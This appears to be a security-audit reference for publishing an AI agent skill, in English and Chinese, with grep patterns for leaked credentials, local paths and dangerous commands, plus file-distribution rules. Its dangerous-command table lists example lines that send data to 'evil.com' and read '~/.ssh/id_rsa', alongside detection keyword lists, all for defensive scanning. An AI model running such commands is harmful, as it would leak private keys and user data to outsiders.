# Security Audit Reference

Complete procedures for pre-publish security scanning, privacy scrubbing, and distribution judgment.

**When to read**: When entering Phase 2 (pre-publish audit). Read this file in full before running any scans.

---

## Three-Layer Security Scan

### Layer 1: Credential Leak Scan

**Grep pattern (v5.0 扩展)**: `token|api_key|api-key|secret|password|ghp_|gho_|ghs_|clh_|sk-|AKIA|cli_|IMA_OPENAPI|FEISHU_APP|APP_SECRET|CLIENTID|APIKEY|client_id|client_secret`

> **v5.0 新增模式**（2026-07，源自 IMA/飞书凭证泄露事件）：
> `cli_`（飞书 app_id 前缀）、`IMA_OPENAPI`（IMA 凭证环境变量名）、`FEISHU_APP`（飞书凭证环境变量名）、`APP_SECRET`（飞书/通用 secret）、`CLIENTID`/`APIKEY`（IMA v1.1.7 凭证）、`client_id`/`client_secret`（OAuth 通用凭证）

**PASS criteria**: Only conceptual mentions in security documentation (e.g., "requests credentials" in a security checklist). No actual token values, API keys, or secrets. 环境变量名出现在 `.gitignore` 或配置说明文档中（如 `$env:FEISHU_APP_ID = "your_app_id"`）算 PASS，但出现真实值（如 `cli_a976385...`）算 FAIL。

**Common leak patterns**:

| Pattern | Example | Fix |
|---------|---------|-----|
| Git remote with token | `https://user:ghp_xxx@github.com/...` | Use SSH or credential helper |
| Hardcoded API key | `OPENAI_API_KEY = "sk-..."` | Move to `.env.local` |
| Config with real values | `"app_id": "cli_a976385..."` | Replace with placeholder in published config |
| Log files with tokens | `publish_run.log` containing `ghp_` | Add `*.log` to .gitignore |
| **IMA 凭证硬编码**（v5.0） | `IMA_OPENAPI_CLIENTID = "CsiB_xxx"` | Replace with `"your_client_id_here"` |
| **飞书凭证硬编码**（v5.0） | `FEISHU_APP_ID = "cli_a976..."` | Replace with `"your_app_id_here"` |
| **Python 脚本含 Token**（v5.0） | `TOKEN = "ghp_xxx"` in upload scripts | Delete script, use env var `GH_TOKEN` |

### Layer 2: Local Path Scan

**Grep pattern**: `C:\\|D:\\|/Users/|/home/|Administrator|\.trae-cn|\.trae\\`

**PASS criteria**: Zero matches. No local absolute paths, no Windows usernames, no `.trae-cn` directory references.

**Common leak patterns**:

| Pattern | Example | Fix |
|---------|---------|-----|
| Absolute paths in docs | `d:\TRAE SOLO CN\project\...` | Use relative paths |
| Username in paths | `C:\Users\Administrator\...` | Use `~` or `<user-home>` |
| .trae-cn references | `.trae-cn/skills/...` | Use `.trae/skills/` (generic) |

### Layer 3: Dangerous Command Scan

**Grep pattern**: `curl|wget|eval|exec|base64|sudo|\.ssh|\.aws|\.config`

**PASS criteria**: Only conceptual mentions in security documentation. No actual curl/wget to external URLs, no eval/exec with external input, no reading of sensitive directories.

**Common leak patterns**:

| Pattern | Example | Fix |
|---------|---------|-----|
| curl to external server | `curl https://evil.com/collect?data=...` | Remove entirely |
| eval with user input | `eval(user_input)` | Remove or sandbox |
| Reading sensitive dirs | `cat ~/.ssh/id_rsa` | Remove |

---

## Scan Execution

Run all three scans via Grep on the entire skill directory:

```
1. Grep: credential pattern → check each match → PASS/FAIL
2. Grep: local path pattern → check each match → PASS/FAIL
3. Grep: dangerous command pattern → check each match → PASS/FAIL
```

**Any FAIL = block publish.** Fix the issue, re-run scan. Only proceed when all three PASS.

---

## Distribution Judgment (Three-Question Test)

For each file in the skill directory, answer three questions:

1. **Does the user need this file after installing the skill?**
2. **Does this file participate in the skill's execution flow?**
3. **Can the skill still work if this file is deleted?**

| Category | Judgment | Action | Examples |
|----------|----------|--------|----------|
| Execution dependency | Three "yes" | Must include | SKILL.md, plugin.json, references/*.md, scripts/*.py |
| Project metadata | Not in execution, but users/devs need | Include | README.md, LICENSE, CHANGELOG.md, docs/*.md |
| Maintainer tools | Three "no" | Exclude | *.ps1, *.sh (publish scripts) |
| VCS config | Three "no" | Exclude from zip, keep in repo | .gitignore |
| Runtime data | Three "no" | Exclude | data/, *.log |
| Credential files | Three "no" + security risk | Must exclude | .env.local, config.local.json |

### Key Distinctions

- `.gitignore` stays in GitHub repo (for developers who clone) but excluded from ClawHub distribution
- `publish_all.ps1` and similar scripts are maintainer tools — never include in distribution
- `references/config.json` with placeholders IS an execution dependency — must include
- `references/config.local.json` with real credentials is NOT — must exclude

### ClawHub Auto-Generated Files (v5.0 新增)

**ClawHub 会自动生成以下文件，禁止手动发布**：

| 文件/目录 | 生成时机 | 处理方式 |
|----------|---------|---------|
| `skill-card.md` | ClawHub 发布时自动生成 | **必须删除**（如果存在于本地） |
| `.clawhub/` | ClawHub install/publish 时生成 | **必须加入 .gitignore**，不发布 |
| `.clawhub/origin.json` | ClawHub install 时生成 | 同上 |
| `_meta.json` | ClawHub publish 时生成 | 同上 |

**发布前检查**：

```bash
# 检查 skill-card.md 是否存在
Test-Path skill-card.md
# 如果存在 → 删除

# 检查 .clawhub/ 目录
Test-Path .clawhub
# 如果存在 → 加入 .gitignore，不删除（本地需要）
```

**故障案例（2026-07）**：web-to-fim 技能发布时，skill-card.md 被打包上传，ClawHub 拒绝发布，报错 "skill-card.md is auto-generated"。删除后重新发布成功。

---

## Common Leak Patterns & Remediation

### Pattern 1: Token in git remote URL

```
# LEAKED
https://EdwardWason:ghp_xxx@github.com/EdwardWason/repo.git

# FIX: Use credential helper or SSH
git remote set-url origin git@github.com:EdwardWason/repo.git
```

### Pattern 2: .env.local in distribution

```
# FIX: Add to .gitignore AND exclusion list
.env.local
config.local.json
```

### Pattern 3: PowerShell script with local paths

```
# LEAKED: publish_all.ps1 contains "d:\TRAE SOLO CN\..."
# FIX: Exclude all .ps1 files from distribution
```

### Pattern 4: Log files with sensitive data

```
# LEAKED: publish_run.log contains tokens and local paths
# FIX: Add *.log to .gitignore and exclusion list
```

---

## Post-Publish Verification

After publishing, verify on both platforms:

### GitHub Verification

```powershell
# List all files in repo
$tree = Invoke-RestMethod -Uri "https://api.github.com/repos/$Owner/$Repo/git/trees/main?recursive=1" -Headers $Headers
$tree.tree | Where-Object { $_.type -eq "blob" } | ForEach-Object { Write-Host $_.path }
# Check: no data/, *.ps1, .env.local, *.log
```

### ClawHub Verification

```bash
clawhub inspect <slug>
# Check: Security field = CLEAN
# Check: file list contains only expected files
```
